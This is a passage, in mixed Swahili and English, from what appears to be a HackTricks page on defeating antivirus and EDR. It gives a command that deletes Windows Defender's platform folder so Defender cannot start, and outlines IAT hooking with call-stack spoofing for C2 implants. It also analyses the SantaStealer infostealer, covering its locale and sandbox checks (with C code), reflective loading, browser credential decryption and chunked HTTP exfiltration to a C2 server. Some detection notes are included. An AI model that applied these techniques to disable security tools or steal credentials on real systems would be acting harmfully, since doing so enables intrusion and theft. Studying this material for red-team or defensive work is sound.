wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Unapaswa kuona njia mpya ya mchakato chini ya `C:\TMP\AV\` na usanidi wa service/registry ukiakisi eneo hilo.

Post-exploitation options
- DLL sideloading/code execution: Drop/replace DLLs ambazo Defender inazopakia kutoka application directory yake ili execute code katika processes za Defender. Angalia sehemu hapo juu: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remove the version-symlink ili mara itakapoanza tena configured path haitatambuliwa na Defender haitafanikiwa kuanza:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Kumbuka kwamba mbinu hii haitoi privilege escalation yenyewe; inahitaji haki za admin.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams wanaweza kuhamisha runtime evasion kutoka kwenye C2 implant na kuiweka ndani ya module lengwa mwenyewe kwa ku-hook Import Address Table (IAT) yake na kupitisha APIs zilizochaguliwa kupitia attacker-controlled, position‑independent code (PIC). Hii inapanua evasion zaidi ya uso mdogo wa API ambao kits nyingi zinaonyesha (mfano, CreateProcessA), na inatoa ulinzi ule ule kwa BOFs na post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
  - Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
  - Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Vidokezo
- Tumia patch baada ya relocations/ASLR na kabla ya matumizi ya kwanza ya import. Reflective loaders like TitanLdr/AceLdr zinaonyesha hooking during DllMain of the loaded module.
- Weka wrappers ndogo na PIC-safe; tatua API halisi kupitia thamani ya asili ya IAT uliyokamata kabla ya patching au kupitia LdrGetProcedureAddress.
- Tumia RW → RX transitions kwa PIC na epuka kuacha writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs huunda mnyororo wa wito bandia (return addresses into benign modules) kisha zinaelekea kwenye API halisi.
- Hii inaondoa detections zinazotarajia canonical stacks kutoka Beacon/BOFs kuelekea sensitive APIs.
- Iambatanishe na stack cutting/stack stitching techniques ili kuingia ndani ya frames zinazotarajiwa kabla ya prologue ya API.

Operational integration
- Weka reflective loader kabla ya post‑ex DLLs ili PIC na hooks ziweze kuanzishwa kwa otomatiki wakati DLL inapopakuliwa.
- Tumia Aggressor script kusajili target APIs ili Beacon na BOFs zipate faida kwa uwazi kutoka njia ile ile ya kuepuka bila mabadiliko ya code.

Detection/DFIR considerations
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) inaonyesha jinsi info‑stealers wa kisasa wanavyochanganya AV bypass, anti‑analysis na credential access katika mtiririko mmoja wa kazi.

### Keyboard layout gating & sandbox delay

- Bendera ya config (`anti_cis`) inaorodhesha installed keyboard layouts kupitia `GetKeyboardLayoutList`. Ikiwa Cyrillic layout inapatikana, sample inaacha alama tupu `CIS` na inahitimisha kabla ya kuendesha stealers, ikihakikisha haiwezi kuchochea kwenye locales zilizokataliwa huku ikiacha artifact ya kuwinda.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Layered `check_antivm` logic

- Variant A hutembeza orodha ya michakato, hukashisha kila jina kwa checksum ya kuzunguka iliyobinafsishwa, na likilinganishwa na embedded blocklists kwa debuggers/sandboxes; inarudia checksum kwa jina la kompyuta na hukagua saraka za kazi kama `C:\analysis`.
- Variant B huangalia sifa za mfumo (kiwango cha chini cha idadi ya michakato, recent uptime), huita `OpenServiceA("VBoxGuest")` kugundua VirtualBox additions, na hufanya timing checks kuzunguka sleeps ili kubaini single-stepping. Ugunduo wowote husitisha kabla modules kuanzishwa.

### Fileless helper + double ChaCha20 reflective loading

- The primary DLL/EXE ina embed Chromium credential helper ambayo au huangushwa kwenye disk au hu-mapped kwa mkono in-memory; fileless mode inatatua imports/relocations yenyewe hivyo hakuna helper artifacts zinazolezwa.
- That helper ina-store DLL ya hatua ya pili iliyosimbwa mara mbili kwa ChaCha20 (two 32-byte keys + 12-byte nonces). Baada ya pass zote mbili, inafanya reflective load ya blob (no `LoadLibrary`) na inaita exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derived kutoka [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Rutini za ChromElevator zinatumia direct-syscall reflective process hollowing ku-inject ndani ya Chromium browser hai, kurithi AppBound Encryption keys, na ku-decrypt passwords/cookies/credit cards moja kwa moja kutoka SQLite databases licha ya ABE hardening.

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` inarudia jedwali la kimataifa la function-pointer `memory_generators` na inazaa thread moja kwa kila module iliyowezeshwa (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Kila thread inaandika matokeo kwenye shared buffers na kuripoti idadi ya faili baada ya dirisha la kujiunga la takriban ~45s.
- Baada ya kumaliza, kila kitu huzipiwa kwa kutumia maktaba iliyounganishwa statically `miniz` kama `%TEMP%\\Log.zip`. `ThreadPayload1` kisha inalala 15s na ku-stream archive katika chunks za 10 MB kupitia HTTP POST kwa `http://<C2>:6767/upload`, ikidanganya browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Kila chunk inaongeza `User-Agent: upload`, `auth: <build_id>`, hiari `w: <campaign_tag>`, na chunk ya mwisho inaongeza `complete: true` ili C2 itambue reassembly imekamilika.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
